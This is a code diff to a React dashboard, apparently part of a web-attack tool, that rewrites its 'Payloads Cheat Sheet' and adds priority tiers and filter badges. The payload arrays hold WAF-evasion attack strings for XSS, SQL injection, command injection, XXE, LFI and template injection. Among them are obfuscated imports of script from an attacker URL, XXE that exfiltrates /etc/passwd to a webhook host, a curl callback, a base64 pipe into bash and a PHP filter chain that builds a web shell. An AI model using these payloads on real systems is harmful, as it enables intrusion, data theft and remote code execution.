@@ -197,6 +197,7 @@ export default function DashboardPage({ params }) {
   // --- Payloads Cheat Sheet states ---
   const [payloadsSearchQuery, setPayloadsSearchQuery] = useState('');
   const [selectedPayloadCategory, setSelectedPayloadCategory] = useState('ALL');
+  const [payloadFilterPriority, setPayloadFilterPriority] = useState('ALL'); // 'ALL', 'HIGH', 'MEDIUM', 'LOW'
 
   // Load origin on client side
   const [origin, setOrigin] = useState('');
@@ -494,78 +495,246 @@ export default function DashboardPage({ params }) {
   const payloadsData = [
     {
       category: 'XSS',
-      title: 'Advanced XSS & Modern WAF Bypass Vectors (2026 Edition)',
+      title: 'Cross-Site Scripting (XSS)',
       items: [
-        { title: 'No-Parentheses Obfuscation Bypass', code: `top['ev'+'al']('import(\\\"${xssPayloadUrl}\\\")')`, desc: 'Evades strict string checks and keyword pattern rules matching alert() or evaluation parentheses.' },
-        { title: 'MathML / SVG Animation Vector (Zero-interaction)', code: `<svg><animate onbegin="import('${xssPayloadUrl}')" attributeName="x"></svg>`, desc: 'Ultra-modern auto-execution vector. Bypasses WAF regexes that inspect classic <script> tags or html event handlers like onload/onerror.' },
-        { title: 'Tag-Less Shadow DOM Injection', code: `<x-xss id=x onclick="eval(atob('${typeof btoa !== 'undefined' ? btoa(`import('${xssPayloadUrl}')`) : 'aW1wb3J0KCd4c3MnKQ=='}'))">click</x-xss>`, desc: 'Uses custom elements with base64 encoded imports to trick static scanning analyzers.' },
-        { title: 'Dynamic String Construct Injection', code: `[]["filter"]["constructor"]("import('${xssPayloadUrl}')")()`, desc: 'Non-alphanumeric JavaScript constructor payload. Evades keyword filters checking for alphanumeric function calls.' },
-        { title: 'Dynamic Import Chunk Splitter', code: `import('htt'+'ps:/'+'/${xssPayloadUrl.replace('https://', '').replace('http://', '')}')`, desc: 'Evades WAFs that inspect parameter traffic for active host domains or link markers.' }
+        { 
+          title: 'Dynamic Blind XSS Payload (2026 Stealth)', 
+          code: `top['ev'+'al']('import(\\\"${xssPayloadUrl}\\\")')`, 
+          desc: 'Evades keyword engines looking for evaluation parameters and alert brackets. Uses ES6 dynamic chunked importing.',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
+          title: 'MathML onbegin Animation Injection', 
+          code: `<svg><animate onbegin="import('${xssPayloadUrl}')" attributeName="x"></svg>`, 
+          desc: 'Triggered instantly during DOM building without using standard elements like <img> or <body>. Bypasses classic HTML parsers.',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
+          title: 'Custom Elements with Shadow DOM clicking', 
+          code: `<x-xss id=x onclick="eval(atob('${typeof btoa !== 'undefined' ? btoa(`import('${xssPayloadUrl}')`) : 'aW1wb3J0KCd4c3MnKQ=='}'))">click</x-xss>`, 
+          desc: 'Bypasses WAF regexes that inspect classic HTML elements. Obfuscates javascript commands inside base64 decoding.',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
+          title: 'HTML5 Image Tag Error Fallback', 
+          code: `<img src=x onerror="import('${xssPayloadUrl}').catch(e=>{})">`, 
+          desc: 'Standard HTML5 event bypass. Uses ES6 import to load external script.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass' 
+        },
+        { 
+          title: 'Simple Image Source alert (Zaman Batu)', 
+          code: `<img src=x onerror=alert(1)>`, 
+          desc: 'The absolute classic. High detection rates but perfect for checking standard unfiltered entry points.',
+          priority: 'LOW', 
+          era: 'Zaman Batu (Classic)' 
+        },
+        { 
+          title: 'Raw Script tag (Zaman Batu)', 
+          code: `<script>alert(1)</script>`, 
+          desc: 'Pure legacy script block. Blocked by 99% of WAFs, but still useful to check local offline databases.',
+          priority: 'LOW', 
+          era: 'Zaman Batu (Classic)' 
+        }
       ]
     },
     {
       category: 'SQLI',
-      title: 'SQLi Advanced WAF Evaders (No-Spaces / Char-Chaining)',
+      title: 'SQL Injection (SQLi)',
       items: [
-        { title: 'MySQL Space-less Filter Bypass', code: `'/**/UNION/**/SELECT/**/1,2,user(),4,5--`, desc: 'Replaces spaces with empty C-style block comments. Defeats simple WAF rules checking space patterns.' },
-        { title: 'Scientific Notation Verification', code: `1e0' OR 1.0=1.0--`, desc: 'Translates literal comparisons into scientific formats to bypass keyword mapping.' },
-        { title: 'Character Concatenation Bypass', code: `' UNION SELECT CONCAT('a','dmin'), 2, 3--`, desc: 'Obfuscates admin query criteria from database signatures.' },
-        { title: 'PGSQL Inline Null Stack', code: `';SELECT/**/pg_sleep(10)/**/AND/**/'1'='1`, desc: 'Delay execution injection using comment separators.' },
-        { title: 'Hex Encoded Query Evaluator', code: `0x61646d696e`, desc: 'Utilizes raw Hex string inputs to completely avoid quotes or character matching patterns.' }
+        { 
+          title: 'MySQL Space-less Filter Bypass', 
+          code: `'/**/UNION/**/SELECT/**/1,2,user(),4,5--`, 
+          desc: 'Replaces whitespace characters with empty C-style block comments to confuse regex space triggers.',
+          priority: 'HIGH', 
+          era: 'WAF Bypass' 
+        },
+        { 
+          title: 'Scientific Notation Arithmetic', 
+          code: `1e0' OR 1.0=1.0--`, 
+          desc: 'Translates query conditions into exponential mathematics to completely bypass simple numeric comparison rules.',
+          priority: 'HIGH', 
+          era: 'WAF Bypass' 
+        },
+        { 
+          title: 'Hexadecimal String Injection', 
+          code: `0x61646d696e`, 
+          desc: 'Bypasses quote filtering by translating SQL string constraints directly to base-16 hexadecimal literals.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass' 
+        },
+        { 
+          title: 'Simple Authentication Bypass (Zaman Batu)', 
+          code: `' OR 1=1--`, 
+          desc: 'Standard query comparison override. High detection rates but classic logic.',
+          priority: 'LOW', 
+          era: 'Zaman Batu (Classic)' 
+        },
+        { 
+          title: 'Basic Admin Single-Quote (Zaman Batu)', 
+          code: `admin'--`, 
+          desc: 'Standard string parameter termination, useful for primitive login portals.',
+          priority: 'LOW', 
+          era: 'Zaman Batu (Classic)' 
+        }
       ]
     },
     {
       category: 'RCE',
-      title: 'Modern RCE WAF Bypass (Variable Expansions & Splitting)',
+      title: 'Command Injection (RCE)',
       items: [
-        { title: 'Bash Variable Expansion / Splitting', code: `c'a't$IFS/e't'c/p'a's's'wd`, desc: 'Tricks pattern matching scanners using single quotes and $IFS variable space substitutions.' },
-        { title: 'Bash Path Wildcard Obfuscation', code: `/bi?/c*t$IFS/et?/pa??wd`, desc: 'Utilizes file system wildcards to execute commands without using plain strings like "/bin/cat /etc/passwd".' },
-        { title: 'Base64 Decoded Pipeline Execution', code: `echo$IFS'Y2F0IC9ldGMvcGFzc3dk'$IFS|$IFS'base64'$IFS'-d'$IFS|$IFS'bash'`, desc: 'Encodes complete command strings inside base64 pipelines. Avoids trigger string keywords.' },
-        { title: 'Bash Empty Uninitialized variable bypass', code: `ca$@t$IFS/etc/pass$@wd`, desc: 'Bash automatically strips empty variables (`$@`) before executing commands, rendering string signatures useless.' },
-        { title: 'PowerShell Concatenation Exfiltrator', code: `&('In'+'voke-Re'+'stMethod') -Uri '${webhookUrl}'`, desc: 'Obfuscates PowerShell commands dynamically using string concatenation.' }
+        { 
+          title: 'Bash IFS & Single Quote Splitting', 
+          code: `c'a't$IFS/e't'c/p'a's's'wd`, 
+          desc: 'Bypasses literal string matches (like "cat" and "/etc/passwd") and space triggers using single quotes and internal field separators.',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
+          title: 'Bash Path Wildcards', 
+          code: `/bi?/c*t$IFS/et?/pa??wd`, 
+          desc: 'Triggers commands using directory wildcard expansion matching, evading keyword filters.',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
+          title: 'Bash Empty Uninitialized variable bypass', 
+          code: `ca$@t$IFS/etc/pass$@wd`, 
+          desc: 'Bash automatically strips empty variables (`$@`) before executing commands, rendering string signatures useless.',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
+          title: 'Base64 Decoded Pipeline', 
+          code: `echo$IFS'Y2F0IC9ldGMvcGFzc3dk'$IFS|$IFS'base64'$IFS'-d'$IFS|$IFS'bash'`, 
+          desc: 'Decodes a base64 string on the fly and pipes it to bash, keeping keywords completely hidden from firewalls.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass' 
+        },
+        { 
+          title: 'Simple cURL Command (Zaman Batu)', 
+          code: `; curl ${webhookUrl}`, 
+          desc: 'Raw cURL request. Easily detected by simple WAF rules looking for outbound HTTP keywords.',
+          priority: 'LOW', 
+          era: 'Zaman Batu (Classic)' 
+        },
+        { 
+          title: 'Basic Semicolon Divider (Zaman Batu)', 
+          code: `; id`, 
+          desc: 'Direct parameter append execution. Easily blocked by character filter rules.',
+          priority: 'LOW', 
+          era: 'Zaman Batu (Classic)' 
+        }
       ]
     },
     {
       category: 'XXE',
-      title: 'Advanced XXE / UTF-16 Blind Encoding Bypasses',
+      title: 'XML External Entity (XXE)',
       items: [
-        { title: 'UTF-16 BE Encoding Wrapper', code: `[Encode Your XML payload to UTF-16 Big Endian]`, desc: 'WAFs inspect traffic using UTF-8. Sending your XXE payload in UTF-16 Big Endian completely blinds most modern firewalls!' },
-        { title: 'Dynamic Nested Parameter Entities', code: `<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "${webhookUrl}/poc.dtd">%dtd;]><foo>&send;</foo>`, desc: 'Evades standard internal parsing checks using external malicious DTD variables to exfiltrate blind logs.' },
-        { title: 'PHP Filter Code Dump Wrapper', code: `<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=config.php">]><foo>&xxe;</foo>`, desc: 'Encodes application configuration files into safe base64 blocks to bypass XML parsing integrity constraints.' }
+        { 
+          title: 'UTF-16 BE Document encoding', 
+          code: `[Convert XML to UTF-16 BE encoding bytes]`, 
+          desc: 'Sending XML document parameters encoded in UTF-16 Big Endian completely blinds WAFs that inspect UTF-8 traffic, while parser parses it normally.',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
+          title: 'Nested Parameter Entities Blind Call', 
+          code: `<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "${webhookUrl}/poc.dtd">%dtd;]><foo>&send;</foo>`, 
+          desc: 'Uses external malicious DTD rules to parse local files and exfiltrate variables to OOB host.',
+          priority: 'HIGH', 
+          era: 'WAF Bypass' 
+        },
+        { 
+          title: 'Classic Local File Traversal (Zaman Batu)', 
+          code: `<?xml version="1.0"?><!DOCTYPE x [<!ENTITY x SYSTEM "file:///etc/passwd">]><x>&x;</x>`, 
+          desc: 'Standard local file reading. Easily blocked by any basic rule inspecting external system keywords.',
+          priority: 'LOW', 
+          era: 'Zaman Batu (Classic)' 
+        }
       ]
     },
     {
       category: 'LFI',
-      title: 'LFI Advanced Traversal & PHP Filter Chaining Bypasses',
+      title: 'Local File Inclusion (LFI)',
       items: [
-        { title: 'Double URL Encoded Traversal', code: `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd`, desc: 'Bypasses filters that decode URLs only once. Standard double percent escapes.' },
-        { title: 'Multi-Byte Unicode Slash Traversal', code: `..%c0%af..%c0%af..%c0%afetc/passwd`, desc: 'Evades standard traversal matchers on vulnerable servers utilizing UTF-8 character normalization.' },
-        { title: 'Modern PHP Filter String Chaining (RCE)', code: `php://filter/convert.iconv.UTF8.CSISO2022KR/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==`, desc: 'Utilizes stream filters to compile custom web shells dynamically in memory.' },
-        { title: 'Non-Standard Windows Path Traversal', code: `..\\..\\..\\..\\..\\..\\..\\..\\/windows/win.ini`, desc: 'Mixing forward and backslashes confuses basic directory index searchers.' }
+        { 
+          title: 'Modern PHP Filter String Chaining (RCE)', 
+          code: `php://filter/convert.iconv.UTF8.CSISO2022KR/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==`, 
+          desc: 'Utilizes base64 stream transformations to dynamically assemble web shell components directly in execution memory, avoiding file writes.',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
+          title: 'Multi-Byte Unicode Slash Traversal', 
+          code: `..%c0%af..%c0%af..%c0%afetc/passwd`, 
+          desc: 'Evades standard traversal matchers on vulnerable servers utilizing UTF-8 character normalization.',
+          priority: 'HIGH', 
+          era: 'WAF Bypass' 
+        },
+        { 
+          title: 'Double URL Encoded Traversal', 
+          code: `%252e%252e%252f%252e%252e%252fetc/passwd`, 
+          desc: 'Evades WAFs that decode URLs only once. Standard double percent escapes.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass' 
+        },
+        { 
+          title: 'Standard dot-dot-slash (Zaman Batu)', 
+          code: `../../../../../../etc/passwd`, 
+          desc: 'Classic Unix directory traversal. Blocked by default on virtually all modern systems.',
+          priority: 'LOW', 
+          era: 'Zaman Batu (Classic)' 
+        }
       ]
     },
     {
       category: 'SSTI',
-      title: 'SSTI Premium Sandbox Evaders (Jinja/Thymeleaf Reflection)',
+      title: 'Server-Side Template Injection (SSTI)',
       items: [
-        { title: 'Jinja2 String Split Attribute Reflection', code: `{{request['__cl'+'ass__']['__bas'+'es__'][0]['__subcl'+'asses__']()}}`, desc: 'Evades static security tools that parse for the explicit string keyword "__class__".' },
-        { title: 'Jinja2 Hex Encoded Reflection Bypass', code: `{{request|attr('__cla'+'ss__')|attr('__bas'+'es__')}}`, desc: 'Utilizes hex and string concatenation filters to bypass sandbox constraints.' },
-        { title: 'Thymeleaf reflection OS execute', code: `__\${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\\\\A").next()}__::.x`, desc: 'Uses pure Java reflection classes inside Thymeleaf to bypass framework logic and trigger RCE.' },
-        { title: 'Java Freemarker command trigger', code: `<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`, desc: 'Standard execute class initiator.' }
+        { 
+          title: 'Jinja2 String Split Attribute Reflection', 
+          code: `{{request['__cl'+'ass__']['__bas'+'es__'][0]['__subcl'+'asses__']()}}`, 
+          desc: 'Evades static code rules that scan parameters for the explicit presence of string terms like "__class__".',
+          priority: 'HIGH', 
+          era: '2026 Stealth' 
+        },
+        { 
+          title: 'Jinja2 Hex Filters Evaluation', 
+          code: `{{request|attr('__cla'+'ss__')|attr('__bas'+'es__')}}`, 
+          desc: 'Combines dynamic attribute getters with string splits to access restricted sandbox scopes.',
+          priority: 'HIGH', 
+          era: 'WAF Bypass' 
+        },
+        { 
+          title: 'Basic Curly Expression (Zaman Batu)', 
+          code: `{{7*7}}`, 
+          desc: 'Simple calculation testing. Used to easily verify if any template parsing engine is active.',
+          priority: 'LOW', 
+          era: 'Zaman Batu (Classic)' 
+        }
       ]
     }
   ];
 
-  // Filter Payloads list based on search and category
+  // Filter Payloads list based on search, category AND Priority Era levels
   const filteredPayloads = payloadsData.filter(cat => {
     return selectedPayloadCategory === 'ALL' || cat.category === selectedPayloadCategory;
   }).map(cat => {
     const items = cat.items.filter(item => {
+      // Priority filter
+      if (payloadFilterPriority !== 'ALL' && item.priority !== payloadFilterPriority) return false;
+
+      // Search filter
       const q = payloadsSearchQuery.toLowerCase();
       return (
         item.title.toLowerCase().includes(q) ||
         item.code.toLowerCase().includes(q) ||
-        item.desc.toLowerCase().includes(q)
+        item.desc.toLowerCase().includes(q) ||
+        item.era.toLowerCase().includes(q)
       );
     });
     return { ...cat, items };
@@ -685,16 +854,52 @@ export default function DashboardPage({ params }) {
           )}
 
           {activeTab === 'PAYLOADS' && (
-            <div className={styles.searchBar}>
-              <Search size={14} className={styles.searchIcon} />
-              <input 
-                type="text" 
-                placeholder="Search tactical payloads..."
-                value={payloadsSearchQuery}
-                onChange={(e) => setPayloadsSearchQuery(e.target.value)}
-                className={styles.searchInput}
-              />
-            </div>
+            <>
+              <div className={styles.searchBar}>
+                <Search size={14} className={styles.searchIcon} />
+                <input 
+                  type="text" 
+                  placeholder="Search tactical payloads..."
+                  value={payloadsSearchQuery}
+                  onChange={(e) => setPayloadsSearchQuery(e.target.value)}
+                  className={styles.searchInput}
+                />
+              </div>
+
+              {/* Priority Filter badging switcher inside sidebar */}
+              <div style={{ display: 'flex', gap: '4px', overflowX: 'auto', paddingBottom: '4px' }}>
+                {[
+                  { id: 'ALL', label: 'All Tiers' },
+                  { id: 'HIGH', label: '🔥 2026 Stealth' },
+                  { id: 'MEDIUM', label: '⚡ WAF Bypass' },
+                  { id: 'LOW', label: '🪨 Zaman Batu' }
+                ].map(prio => (
+                  <button
+                    key={prio.id}
+                    onClick={() => setPayloadFilterPriority(prio.id)}
+                    className={`badge`}
+                    style={{ 
+                      cursor: 'pointer', 
+                      fontSize: '0.58rem',
+                      padding: '4px 6px',
+                      borderRadius: '4px',
+                      whiteSpace: 'nowrap',
+                      border: payloadFilterPriority === prio.id 
+                        ? '1px solid var(--color-primary)' 
+                        : '1px solid rgba(255,255,255,0.05)',
+                      background: payloadFilterPriority === prio.id 
+                        ? 'var(--color-primary-glow)' 
+                        : 'rgba(0,0,0,0.2)',
+                      color: payloadFilterPriority === prio.id 
+                        ? 'var(--color-primary)' 
+                        : 'var(--text-muted)'
+                    }}
+                  >
+                    {prio.label}
+                  </button>
+                ))}
+              </div>
+            </>
           )}
         </div>
 
@@ -1521,7 +1726,7 @@ export default function DashboardPage({ params }) {
               {filteredPayloads.length === 0 ? (
                 <div style={{ textAlign: 'center', padding: '40px', color: 'var(--text-muted)' }}>
                   <HelpCircle size={32} style={{ margin: '0 auto 12px', color: 'var(--text-dark)' }} />
-                  <p>No payloads match your current search query.</p>
+                  <p>No payloads match your current search and tier filter criteria.</p>
                 </div>
               ) : (
                 filteredPayloads.map(cat => (
@@ -1548,9 +1753,59 @@ export default function DashboardPage({ params }) {
                           }}
                         >
                           <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
-                            <h4 style={{ fontSize: '0.85rem', fontWeight: '750', color: 'var(--text-main)' }}>
-                              {item.title}
-                            </h4>
+                            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                              <h4 style={{ fontSize: '0.85rem', fontWeight: '750', color: 'var(--text-main)' }}>
+                                {item.title}
+                              </h4>
+                              
+                              {/* Dynamically Color-Coded Badges based on Era/Priority */}
+                              {item.priority === 'HIGH' ? (
+                                <span 
+                                  style={{ 
+                                    fontSize: '0.62rem', 
+                                    fontWeight: '750', 
+                                    background: 'rgba(255, 23, 68, 0.12)', 
+                                    color: '#ff1744', 
+                                    border: '1px solid rgba(255, 23, 68, 0.25)',
+                                    padding: '2px 8px',
+                                    borderRadius: '4px',
+                                    letterSpacing: '0.5px'
+                                  }}
+                                  className="animate-pulse-glow"
+                                >
+                                  🔥 HIGH TIER ({item.era})
+                                </span>
+                              ) : item.priority === 'MEDIUM' ? (
+                                <span 
+                                  style={{ 
+                                    fontSize: '0.62rem', 
+                                    fontWeight: '750', 
+                                    background: 'rgba(255, 145, 0, 0.12)', 
+                                    color: '#ff9100', 
+                                    border: '1px solid rgba(255, 145, 0, 0.25)',
+                                    padding: '2px 8px',
+                                    borderRadius: '4px'
+                                  }}
+                                >
+                                  ⚡ MID TIER ({item.era})
+                                </span>
+                              ) : (
+                                <span 
+                                  style={{ 
+                                    fontSize: '0.62rem', 
+                                    fontWeight: '700', 
+                                    background: 'rgba(150, 150, 150, 0.08)', 
+                                    color: '#a0a0a0', 
+                                    border: '1px solid rgba(150, 150, 150, 0.2)',
+                                    padding: '2px 8px',
+                                    borderRadius: '4px'
+                                  }}
+                                >
+                                  🪨 LOW TIER ({item.era})
+                                </span>
+                              )}
+                            </div>
+                            
                             <span style={{ fontSize: '0.7rem', color: 'var(--text-muted)', fontFamily: 'monospace' }}>
                               {cat.category}-00{idx + 1}
                             </span>
